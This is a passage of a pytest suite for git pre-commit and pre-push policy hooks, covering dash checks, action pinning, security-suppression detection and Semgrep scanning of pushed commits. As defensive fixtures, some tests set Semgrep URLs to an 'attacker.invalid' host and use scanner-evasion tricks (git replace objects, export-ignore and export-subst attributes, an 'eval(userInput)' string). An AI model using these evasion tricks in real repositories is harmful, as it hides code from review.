        errors="replace",
        check=False,
    )
    assert mismatch.returncode == 1
    assert "branch context mismatch" in mismatch.stderr


def test_commit_message_policy_handles_clean_dirty_and_missing(tmp_path: Path) -> None:
    message = tmp_path / "message"
    _write_lf(message, "fix: clean\n")
    assert policy.check_commit_message(message) == 0

    _write_lf(message, f"fix: bad {chr(0x2013)} range\n")
    assert policy.check_commit_message(message) == 1

    message.write_bytes(b"fix: invalid byte \xff\n")
    assert policy.check_commit_message(message) == 0

    message.write_bytes("fix: bad \N{EM DASH} message\n".encode() + b"\xff")
    assert policy.check_commit_message(message) == 1
    assert policy.check_commit_message(tmp_path / "missing") == 0


def test_handoff_policy_blocks_only_the_read_only_path(tmp_path: Path) -> None:
    assert policy.check_handoff(["README.md"], tmp_path) == 0
    assert policy.check_handoff([".agents/HANDOFF.md"], tmp_path) == 1
    assert policy.check_handoff(["../.agents/HANDOFF.md"], tmp_path) == 0


def test_session_policy_requires_and_validates_session(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_merge_in_progress", lambda _root: False)
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0))

    assert policy.check_sessions([".agents/planning/plan.md"], tmp_path) == 1
    assert (
        policy.check_sessions(
            [".agents/sessions/2026-07-19-session-1-test.json"],
            tmp_path,
        )
        == 0
    )


def test_session_policy_propagates_validator_failure_and_skips_merge(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_merge_in_progress", lambda _root: False)
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(1))
    path = ".agents/sessions/2026-07-19-session-1-test.json"
    assert policy.check_sessions([path], tmp_path) == 1

    monkeypatch.setattr(policy, "_merge_in_progress", lambda _root: True)
    assert policy.check_sessions([], tmp_path) == 0


def test_staged_dash_policy_reads_the_index_blob(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    _write_lf(repo / "doc.md", f"bad {chr(0x2014)} text\n")
    _write_file(repo, "doc.md", f"bad {chr(0x2014)} text\n")
    _git(repo, "add", "doc.md")
    _write_lf(repo / "doc.md", "working tree clean\n")
    _write_file(repo, "doc.md", "working tree clean\n")

    assert policy.check_staged_dashes(["doc.md"], repo) == 1
    assert policy.check_staged_dashes([], repo) == 0
    assert policy.check_staged_dashes(["../doc.md"], repo) == 2


def test_staged_dash_policy_uses_utf8_under_non_utf8_locale(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "nested/doc.md", "clean\n")
    (repo / "nested/doc.md").write_bytes(b"bad \xe2\x80\x94 text\n")
    _git(repo, "add", "nested/doc.md")
    monkeypatch.setenv("LC_ALL", "C")

    assert policy.check_staged_dashes(["nested/doc.md"], repo) == 1


def test_staged_dash_policy_continues_after_clean_file(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    clean = repo / "clean.md"
    bad = repo / "bad.md"
    _write_lf(clean, "clean\n")
    _write_lf(bad, "bad \N{EN DASH} text\n")
    _git(repo, "add", "clean.md", "bad.md")

    assert policy.check_staged_dashes(["clean.md", "bad.md"], repo) == 1


def test_git_command_boundary_forces_utf8_replacement(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    captured: dict[str, object] = {}
    monkeypatch.setenv("GIT_GRAFT_FILE", str(tmp_path / "alternate-grafts"))
    monkeypatch.setenv("GIT_SHALLOW_FILE", str(tmp_path / "alternate-shallow"))
    monkeypatch.setenv("GIT_TEST_COMMIT_GRAPH", "1")
    monkeypatch.setenv("GIT_TEST_COMMIT_GRAPH_DIE_ON_LOAD", "1")
    monkeypatch.setenv("SEMGREP_APP_URL", "https://attacker.invalid")
    monkeypatch.setenv("SEMGREP_BASELINE_COMMIT", "HEAD")
    monkeypatch.setenv("SEMGREP_BASELINE_REF", "HEAD")
    monkeypatch.setenv("SEMGREP_URL", "https://attacker.invalid")

    def fake_run(*args: object, **kwargs: object) -> subprocess.CompletedProcess[str]:
        captured["args"] = args[0]
        captured.update(kwargs)
        return _completed(0)

    monkeypatch.setattr(policy.subprocess, "run", fake_run)

    policy._run_git(tmp_path, ["status", "--short"])

    assert captured["args"] == [
        "git",
        "-c",
        "core.commitGraph=false",
        "status",
        "--short",
    ]
    assert captured["encoding"] == "utf-8"
    assert captured["errors"] == "replace"
    assert captured["timeout"] == policy.DEFAULT_SUBPROCESS_TIMEOUT_SECONDS
    env = captured["env"]
    assert isinstance(env, dict)
    assert env["GIT_NO_REPLACE_OBJECTS"] == "1"
    assert env["GIT_TEST_COMMIT_GRAPH"] == "0"
    assert "GIT_TEST_COMMIT_GRAPH_DIE_ON_LOAD" not in env
    assert "GIT_GRAFT_FILE" not in env
    assert "GIT_SHALLOW_FILE" not in env
    assert "SEMGREP_APP_URL" not in env
    assert "SEMGREP_BASELINE_COMMIT" not in env
    assert "SEMGREP_BASELINE_REF" not in env
    assert "SEMGREP_URL" not in env


def test_command_boundary_maps_timeout_to_external_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def time_out(*args: object, **kwargs: object) -> subprocess.CompletedProcess[str]:
        command = args[0]
        timeout = kwargs["timeout"]
        assert isinstance(command, list)
        assert all(isinstance(part, str) for part in command)
        assert isinstance(timeout, (int, float))
        raise subprocess.TimeoutExpired(
            command,
            timeout,
            output="partial output\n",
            stderr="child stalled\n",
        )

    monkeypatch.setattr(policy.subprocess, "run", time_out)

    result = policy._run_command(
        [sys.executable, "scripts/slow_tool.py", "scan"],
        tmp_path,
    )

    assert result.returncode == 3
    assert result.stdout == "partial output\n"
    assert result.stderr == (
        "child stalled\n"
        f"ERROR: {Path(sys.executable).name} slow_tool.py scan "
        "timed out after 90 seconds\n"
    )


def test_binary_command_boundary_maps_timeout_to_external_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def time_out(*args: object, **kwargs: object) -> subprocess.CompletedProcess[bytes]:
        command = args[0]
        timeout = kwargs["timeout"]
        assert isinstance(command, list)
        assert all(isinstance(part, str) for part in command)
        assert isinstance(timeout, (int, float))
        raise subprocess.TimeoutExpired(
            command,
            timeout,
            output=b"partial bytes\n",
            stderr=b"binary child stalled\n",
        )

    monkeypatch.setattr(policy.subprocess, "run", time_out)

    result = policy._run_command_bytes(
        ["git", "-c", "core.commitGraph=false", "diff", "--name-only"],
        tmp_path,
    )

    assert result.returncode == 3
    assert result.stdout == b"partial bytes\n"
    assert result.stderr == (b"binary child stalled\nERROR: git diff timed out after 90 seconds\n")


@pytest.mark.parametrize(
    ("value", "expected_text", "expected_bytes"),
    [
        (None, "", b""),
        (b"value\xff", "value\ufffd", b"value\xff"),
        ("value", "value", b"value"),
    ],
)
def test_timeout_output_conversion_preserves_available_data(
    value: bytes | str | None,
    expected_text: str,
    expected_bytes: bytes,
) -> None:
    assert policy._timeout_text(value) == expected_text
    assert policy._timeout_bytes(value) == expected_bytes


@pytest.mark.parametrize(
    ("args", "expected"),
    [
        ([], "subprocess"),
        (["tool"], "tool"),
        (["gh", "pr"], "gh pr"),
        (["gh", "bad\ncommand"], "gh"),
        (["python3"], "python3"),
        (["python3", "-m", "pytest"], "python3 -m pytest"),
        (["python3", "-m", "bad\nmodule"], "python3"),
        (["python3", "scripts/check.py"], "python3 check.py"),
        (["python3", "bad\nscript.py"], "python3"),
        (["python3", "scripts/check.py", "verify"], "python3 check.py verify"),
        (["python3", "scripts/check.py", "bad\ncommand"], "python3 check.py"),
        (["git"], "git"),
        (["git", "--no-pager", "diff"], "git diff"),
        (["git", "bad\ncommand"], "git"),
    ],
)
def test_timeout_subject_is_diagnostic_without_untrusted_operands(
    args: list[str],
    expected: str,
) -> None:
    assert policy._timeout_subject(args) == expected


def test_binary_git_reads_disable_commit_graphs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    captured: list[str] = []

    def fake_run(
        args: Sequence[str],
        _repo_root: Path,
    ) -> subprocess.CompletedProcess[bytes]:
        captured.extend(args)
        return subprocess.CompletedProcess([], 0, b"", b"")

    monkeypatch.setattr(policy, "_run_command_bytes", fake_run)

    policy._run_git_bytes(tmp_path, ["cat-file", "blob", "abc"])

    assert captured == [
        "git",
        "-c",
        "core.commitGraph=false",
        "cat-file",
        "blob",
        "abc",
    ]


def test_alternate_index_controls_staged_blob_and_generated_staging(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "doc.md", "clean\n")
    generated = repo / ".vscode/mcp.json"
    _commit_file(repo, ".vscode/mcp.json", "{}\n")
    alternate_index = repo / ".git/alternate-index"
    shutil.copy2(repo / ".git/index", alternate_index)
    monkeypatch.setenv("GIT_INDEX_FILE", str(alternate_index))
    _write_lf(repo / "doc.md", f"bad {chr(0x2014)} text\n")
    _write_file(repo, "doc.md", f"bad {chr(0x2014)} text\n")
    _git(repo, "add", "doc.md")
    generated.unlink()

    assert policy.check_staged_dashes(["doc.md"], repo) == 1
    assert policy.stage_generated("mcp", repo) == 0
    staged = _git(repo, "diff", "--cached", "--name-only").stdout.splitlines()
    assert staged == [".vscode/mcp.json", "doc.md"]

    monkeypatch.delenv("GIT_INDEX_FILE")
    default_staged = _git(repo, "diff", "--cached", "--name-only").stdout
    assert default_staged == ""


def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
    assert LEFTHOOK is not None
    repo = tmp_path / "repo"
    _init_repo(repo)
    recorder = repo / "record_staged.py"
    _write_lf(
        recorder,
        "import os\n"
        "import sys\n"
        "from pathlib import Path\n"
        "Path('observed.txt').write_text(\n"
        "    os.environ.get('GIT_INDEX_FILE', '') + '\\n' + '\\n'.join(sys.argv[1:]),\n"
        "    encoding='utf-8',\n"
        ")\n",
    )
    config = {
        "pre-commit": {
            "jobs": [
                {
                    "name": "record-staged",
                    "glob": "*.md",
                    "run": f'"{PYTHON_POSIX}" record_staged.py {{staged_files}}',
                }
            ]
        }
    }
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
    _write_lf(repo / "default.md", "base\n")
    _write_lf(repo / "alternate.md", "base\n")
    _git(repo, "add", "lefthook.yml", "record_staged.py", "default.md", "alternate.md")
    _git(repo, "commit", "-qm", "test: add active-index probe")

    alternate_index = repo / ".git/alternate-index"
    shutil.copy2(repo / ".git/index", alternate_index)
    _write_lf(repo / "default.md", "default change\n")
    _git(repo, "add", "default.md")

    _run_lefthook(
        repo,
        "run",
        "pre-commit",
        env={"GIT_INDEX_FILE": str(alternate_index)},
    )
    observed = repo / "observed.txt"
    assert not observed.exists()

    _write_lf(repo / "alternate.md", "alternate change\n")
    process_env = os.environ.copy()
    process_env["GIT_INDEX_FILE"] = str(alternate_index)
    process_env["LEFTHOOK_BIN"] = LEFTHOOK
    subprocess.run(
        ["git", "add", "--", "alternate.md"],
        cwd=repo,
        env=process_env,
        check=True,
    )
    _run_lefthook(repo, "install", "--reset-hooks-path")

    result = subprocess.run(
        ["git", "commit", "-m", "test: alternate index"],
        cwd=repo,
        env=process_env,
        text=True,
        encoding="utf-8",
        errors="replace",
        capture_output=True,
        check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert observed.read_text(encoding="utf-8").splitlines() == [
        str(alternate_index),
        "alternate.md",
    ]
    assert _git(repo, "show", "HEAD:alternate.md").stdout == "alternate change\n"
    assert _git(repo, "show", ":alternate.md").stdout == "base\n"
    assert _git(repo, "show", ":default.md").stdout == "default change\n"


def test_staged_dash_policy_skips_vendored_paths(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    path = repo / "node_modules/pkg/README.md"
    path.parent.mkdir(parents=True)
    _write_lf(path, f"vendor {chr(0x2014)} text\n")
    _git(repo, "add", "-f", "node_modules/pkg/README.md")

    assert policy.check_staged_dashes(["node_modules/pkg/README.md"], repo) == 0


def test_action_pin_policy_checks_staged_content(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    workflow = repo / ".github/workflows/test.yml"
    workflow.parent.mkdir(parents=True)
    _write_lf(workflow, "steps:\n  - uses: actions/checkout@v4\n")
    _git(repo, "add", ".github/workflows/test.yml")

    assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 1
    _write_lf(
        workflow,
        "steps:\n  - uses: actions/checkout@1234567890123456789012345678901234567890\n",
    )
    _git(repo, "add", ".github/workflows/test.yml")
    assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 0


def test_action_pin_policy_allows_local_actions_and_rejects_unsafe_paths(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    workflow = repo / ".github/workflows/test.yml"
    workflow.parent.mkdir(parents=True)
    _write_lf(workflow, "steps:\n  - uses: ./local-action\n")
    _git(repo, "add", ".github/workflows/test.yml")

    assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 0
    assert policy.check_staged_action_pins(["../outside.yml"], repo) == 2


def test_security_suppression_policy_blocks_only_active_code(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    source = repo / "source.py"
    suppression_a = "# no" + "sec"
    suppression_b = "# no" + "sem" + "grep"
    _write_lf(source, f"value = 1  {suppression_a}\n")

    assert policy.check_security_suppressions(["source.py"], repo) == 1
    _write_lf(source, f"value = 1  {suppression_b}\n")
    assert policy.check_security_suppressions(["source.py"], repo) == 1
    _write_lf(source, "value = 1\n")
    assert policy.check_security_suppressions(["source.py"], repo) == 0
    assert policy.check_security_suppressions(["missing.py"], repo) == 0


def test_security_suppression_policy_rejects_unsafe_paths(tmp_path: Path) -> None:
    assert policy.check_security_suppressions(["../outside.py"], tmp_path) == 2


def test_yamllint_advisory_honors_scope_and_skip(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        _root: Path,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(args))
        return _completed(1, stderr="style finding\n")

    monkeypatch.setattr(policy, "_run_command", fake_run)
    assert policy.run_yamllint(["nested/config.yml"], tmp_path) == 0
    assert calls == [["yamllint", "-f", "parsable", "--", "nested/config.yml"]]

    monkeypatch.setenv("SKIP_YAMLLINT", "1")
    assert policy.run_yamllint(["other.yml"], tmp_path) == 0
    assert len(calls) == 1
    assert "SKIP_YAMLLINT=1" in capsys.readouterr().out


def test_skillforge_excludes_fixtures_and_command_mirrors(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        _root: Path,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(args))
        return _completed(0)

    monkeypatch.setattr(policy, "_run_command", fake_run)
    result = policy.run_skillforge(
        [
            "evals/example/SKILL.md",
            "src/copilot-cli/skills/build/SKILL.md",
            ".claude/skills/real-skill/SKILL.md",
        ],
        tmp_path,
    )

    # Fixtures and command mirrors are skipped before any subprocess runs, so
    # the only skill that reaches SkillForge is the real one. The
    # frontmatter-only exemption probes HEAD and index blobs via _run_command
    # first, so filter to the validator invocation rather than counting every
    # subprocess call.
    validate_calls = [
        call for call in calls if any("validate-skill.py" in str(arg) for arg in call)
    ]
    assert result == 0
    assert len(validate_calls) == 1
    assert validate_calls[0][-1] == ".claude/skills/real-skill"


def test_generated_staging_uses_the_named_allowlist(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, ".vscode/mcp.json", '{"version": 1}\n')
    (repo / ".factory").mkdir()
    _write_lf(repo / ".vscode/mcp.json", '{"version": 2}\n')
    _write_lf(repo / ".factory/mcp.json", "{}\n")
    _write_lf(repo / "unrelated.txt", "do not stage\n")
    _write_file(repo, ".vscode/mcp.json", '{"version": 2}\n')
    (repo / ".factory/mcp.json").write_text("{}\n", encoding="utf-8")
    (repo / "unrelated.txt").write_text("do not stage\n", encoding="utf-8")

    assert policy.stage_generated("mcp", repo) == 0

    staged = _git(repo, "diff", "--cached", "--name-only").stdout.splitlines()
    assert staged == [".factory/mcp.json", ".vscode/mcp.json"]
    assert _git(repo, "status", "--short", "unrelated.txt").stdout.startswith("??")


@pytest.mark.parametrize(
    ("kind", "generated_path"),
    [
        pytest.param("mcp", ".vscode/mcp.json", id="explicit-output"),
        pytest.param(
            "agents",
            "src/copilot-cli/agents/removed.agent.md",
            id="simple-glob",
        ),
        pytest.param(
            "memory",
            ".serena/memories/removed.md",
            id="recursive-glob-root",
        ),
        pytest.param(
            "memory",
            ".serena/memories/nested/removed.md",
            id="recursive-glob-nested",
        ),
    ],
)
def test_stage_generated_stages_only_allowlisted_tracked_deletion(
    tmp_path: Path,
    kind: str,
    generated_path: str,
) -> None:
    repo = tmp_path / "repo"
    unrelated_path = "unrelated.txt"
    _init_repo(repo)
    generated = repo / generated_path
    generated.parent.mkdir(parents=True, exist_ok=True)
    _write_lf(generated, "generated\n")
    _write_lf(repo / unrelated_path, "unrelated\n")
    _git(repo, "add", "--", generated_path, unrelated_path)
    _git(repo, "commit", "-qm", "test: add generated and unrelated files")
    generated.unlink()
    (repo / unrelated_path).unlink()

    assert policy.stage_generated(kind, repo) == 0

    staged_deletions = _git(
        repo,
        "diff",
        "--cached",
        "--name-only",
        "--diff-filter=D",
    ).stdout.splitlines()
    unstaged_deletions = _git(
        repo,
        "diff",
        "--name-only",
        "--diff-filter=D",
    ).stdout.splitlines()
    assert staged_deletions == [generated_path]
    assert unstaged_deletions == [unrelated_path]


def test_generated_staging_rejects_symlinked_ancestor(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    generated = tmp_path / ".vscode/mcp.json"
    generated.parent.mkdir(parents=True)
    _write_lf(generated, "{}\n")
    original_is_symlink = Path.is_symlink
    monkeypatch.setattr(
        Path,
        "is_symlink",
        lambda path: path == generated.parent or original_is_symlink(path),
    )

    assert policy.stage_generated("mcp", tmp_path) == 2
    with pytest.raises(SystemExit):
        policy.main(["stage-generated", "unknown"])


def test_episode_extraction_stages_only_reported_output(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    session = ".agents/sessions/2026-07-19-session-1-test.json"
    (repo / session).parent.mkdir(parents=True)
    _write_lf(repo / session, "{}\n")
    episode = repo / ".agents/memory/episodes/episode-2026-07-19-session-1-test.json"
    episode.parent.mkdir(parents=True)
    _write_lf(episode, "{}\n")
    original_run = policy._run_command

    def fake_run(
        args: Sequence[str],
        root: Path,
        *,
        input_text: str | None = None,
        extra_env: Mapping[str, str] | None = None,
    ) -> subprocess.CompletedProcess[str]:
        if "extract_session_episode.py" in " ".join(args):
            return _completed(0, json.dumps({"id": episode.stem}))
        return original_run(
            args,
            root,
            input_text=input_text,
            extra_env=extra_env,
        )

    monkeypatch.setattr(policy, "_run_command", fake_run)

    assert policy.extract_session_episodes([session], repo) == 0
    assert (
        episode.relative_to(repo).as_posix()
        in _git(repo, "diff", "--cached", "--name-only").stdout.splitlines()
    )


def test_episode_extraction_is_advisory_but_rejects_unsafe_paths(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(1))
    session = ".agents/sessions/2026-07-19-session-1-test.json"

    assert policy.extract_session_episodes([session], tmp_path) == 0
    assert policy.extract_session_episodes(["../session.json"], tmp_path) == 2


def _episode_payload(episode_id: str, content: str) -> dict[str, object]:
    return {
        "id": episode_id,
        "session": episode_id,
        "timestamp": "2026-07-19T00:00:00+00:00",
        "task": "migration",
        "outcome": "success",
        "decisions": [],
        "events": [
            {
                "id": "event-1",
                "timestamp": "2026-07-19T00:00:00+00:00",
                "type": "milestone",
                "content": content,
                "caused_by": [],
                "leads_to": [],
            }
        ],
        "metrics": {},
        "lessons": [],
    }


@pytest.mark.parametrize(
    ("tool_exit", "expected"),
    [(0, 0), (2, 2), (3, 3)],
)
def test_semgrep_exit_mapping(
    tool_exit: int,
    expected: int,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(tool_exit),
    )

    assert policy.run_semgrep(tmp_path) == expected


def test_pushed_suppression_scan_ignores_clean_worktree_override(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "nested/source.py", "value = 1\n")
    source = repo / "nested/source.py"
    _write_lf(source, f"value = 1  {'# no' + 'sec'}\n")
    _write_file(repo, "nested/source.py", f"value = 1  {'# no' + 'sec'}\n")
    _git(repo, "add", "nested/source.py")
    _git(repo, "commit", "-qm", "test: pushed suppression")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    _write_lf(source, "value = 1\n")
    _write_file(repo, "nested/source.py", "value = 1\n")
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")

    assert policy.check_pushed_suppressions(stream, repo) == 1


@pytest.mark.parametrize(
    ("suffix", "comment_prefix", "comment_suffix"),
    [
        (".js", "// ", ""),
        (".ps1", "# ", ""),
        (".psm1", "# ", ""),
        (".py", "# ", ""),
        (".ts", "/* ", " */"),
        (".yaml", "# ", ""),
        (".yml", "# ", ""),
    ],
)
def test_pushed_suppression_scan_covers_semgrep_suffixes(
    suffix: str,
    comment_prefix: str,
    comment_suffix: str,
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "base.txt", "base\n")
    suppression = comment_prefix + "no" + "sem" + "grep" + comment_suffix
    head = _commit_file(repo, f"source{suffix}", f"value: unsafe  {suppression}\n")
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")

    assert policy.check_pushed_suppressions(stream, repo) == 1


def test_pushed_suppression_scan_ignores_unchanged_legacy_suppressions(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "legacy.py", f"value = 1  {'# no' + 'sec'}\n")
    base = _commit_file(repo, "source.py", "value = 1\n")
    source = repo / "source.py"
    _write_lf(source, "value = 2\n")
    _write_file(repo, "source.py", "value = 2\n")
    _git(repo, "add", "source.py")
    _git(repo, "commit", "-qm", "test: update clean source")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")

    assert policy.check_pushed_suppressions(stream, repo) == 0


def test_pushed_semgrep_scan_materializes_immutable_head(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "nested/source.py", "value = 1\n")
    base = _commit_file(repo, "unchanged.py", "dangerous = True\n")
    source = repo / "nested/source.py"
    _write_lf(source, "dangerous = True\n")
    _write_file(repo, "nested/source.py", "dangerous = True\n")
    _git(repo, "add", "nested/source.py")
    _git(repo, "commit", "-qm", "test: pushed finding")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    _write_lf(source, "dangerous = False\n")
    _write_file(repo, "nested/source.py", "dangerous = False\n")

    def fake_scan(
        tree: Path,
        paths: Sequence[str],
        _root: Path,
    ) -> subprocess.CompletedProcess[str]:
        assert paths == ["nested/source.py"]
        assert not (tree / "unchanged.py").exists()
        content = (tree / "nested/source.py").read_text(encoding="utf-8")
        return _completed(1 if "True" in content else 0)

    monkeypatch.setattr(policy, "_run_semgrep_tree", fake_scan)
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")

    assert policy.scan_pushed_heads(stream, repo) == 1


def test_pushed_semgrep_scan_reads_export_ignored_changed_blob(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "nested/source.py", "value = 1\n")
    _write_lf(repo / "nested/source.py", "dangerous = True\n")
    _write_lf(repo / ".gitattributes", "nested/source.py export-ignore\n")
    _write_file(repo, "nested/source.py", "dangerous = True\n")
    (repo / ".gitattributes").write_text(
        "nested/source.py export-ignore\n",
        encoding="utf-8",
    )
    _git(repo, "add", "nested/source.py", ".gitattributes")
    _git(repo, "commit", "-qm", "test: hide pushed finding")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")

    def fake_scan(
        tree: Path,
        paths: Sequence[str],
        _root: Path,
    ) -> subprocess.CompletedProcess[str]:
        assert "nested/source.py" in paths
        content = (tree / "nested/source.py").read_text(encoding="utf-8")
        return _completed(1 if "dangerous = True" in content else 0)

    monkeypatch.setattr(policy, "_run_semgrep_tree", fake_scan)

    assert policy.scan_pushed_heads(stream, repo) == 1


def test_pushed_semgrep_scan_reads_unsubstituted_changed_blob(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "source.js", "const safe = true;\n")
    _write_lf(repo / "source.js", "const value = '$Format:a%eval(userInput);$';\n")
    _write_lf(repo / ".gitattributes", "source.js export-subst\n")
    _write_file(repo, "source.js", "const value = '$Format:a%eval(userInput);$';\n")
    (repo / ".gitattributes").write_text("source.js export-subst\n", encoding="utf-8")
    _git(repo, "add", "source.js", ".gitattributes")
    _git(repo, "commit", "-qm", "test: substitute pushed finding")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")

    def fake_scan(
        tree: Path,
        paths: Sequence[str],
        _root: Path,
    ) -> subprocess.CompletedProcess[str]:
        assert "source.js" in paths
        content = (tree / "source.js").read_text(encoding="utf-8")
        return _completed(1 if "$Format:a%eval(userInput);$" in content else 0)

    monkeypatch.setattr(policy, "_run_semgrep_tree", fake_scan)

    assert policy.scan_pushed_heads(stream, repo) == 1


def test_pushed_semgrep_scan_ignores_local_replacement_blob(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "source.py", "dangerous = False\n")
    _write_lf(repo / "source.py", "dangerous = True\n")
    _write_file(repo, "source.py", "dangerous = True\n")
    _git(repo, "add", "source.py")
    _git(repo, "commit", "-qm", "test: pushed finding")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    dangerous_blob = _git(repo, "rev-parse", f"{head}:source.py").stdout.strip()
    benign = repo / "benign.py"
    _write_lf(benign, "dangerous = False\n")
    benign_blob = _git(repo, "hash-object", "-w", str(benign)).stdout.strip()
    _git(repo, "replace", dangerous_blob, benign_blob)
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")

    def fake_scan(
        tree: Path,
        paths: Sequence[str],
        _root: Path,
    ) -> subprocess.CompletedProcess[str]:
        assert paths == ["source.py"]
        content = (tree / "source.py").read_text(encoding="utf-8")
        return _completed(1 if "dangerous = True" in content else 0)

    monkeypatch.setattr(policy, "_run_semgrep_tree", fake_scan)

    assert policy.scan_pushed_heads(stream, repo) == 1


@pytest.mark.parametrize("mode", ["120000", "160000"])
def test_pushed_semgrep_scan_rejects_non_regular_type_change(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    mode: str,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "source.py", "value = 1\n")
    if mode == "120000":
        target = repo / "link-target"
        _write_lf(target, "payload.txt")
        object_id = _git(repo, "hash-object", "-w", str(target)).stdout.strip()
    else:
        object_id = base
    _git(repo, "update-index", "--cacheinfo", mode, object_id, "source.py")
    _git(repo, "commit", "-qm", "test: replace source type")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")
    monkeypatch.setattr(
        policy,
        "_run_semgrep_tree",
        lambda *_args: pytest.fail("Semgrep must not run on a non-regular snapshot"),
    )

    assert policy.scan_pushed_heads(stream, repo) == 2


@pytest.mark.parametrize(
    "paths",
    [
        ["source.py", "SOURCE.py"],
        ["source.py", "source.py. "],
        ["source.py:payload"],
    ],
)
def test_pushed_semgrep_validates_all_paths_before_suffix_selection(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    paths: list[str],
) -> None:
    monkeypatch.setattr(policy, "_push_updates", lambda *_args: [_push_update()])
    monkeypatch.setattr(policy, "_changed_commit_paths", lambda *_args: paths)
    monkeypatch.setattr(policy, "_commit_paths", lambda *_args: paths)
    monkeypatch.setattr(
        policy,
        "_scan_pushed_head",
        lambda *_args: pytest.fail("invalid pushed paths must not reach Semgrep"),
    )

    assert policy.scan_pushed_heads(io.StringIO(), tmp_path) == 2


def test_pushed_semgrep_detects_collision_with_unchanged_head_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_push_updates", lambda *_args: [_push_update()])
    monkeypatch.setattr(
        policy,
        "_changed_commit_paths",
        lambda *_args: ["SOURCE.py"],
    )
    monkeypatch.setattr(
        policy,
        "_commit_paths",
        lambda *_args: ["source.py", "SOURCE.py"],
    )
    monkeypatch.setattr(
        policy,
        "_scan_pushed_head",
        lambda *_args: pytest.fail("colliding pushed trees must not reach Semgrep"),
    )

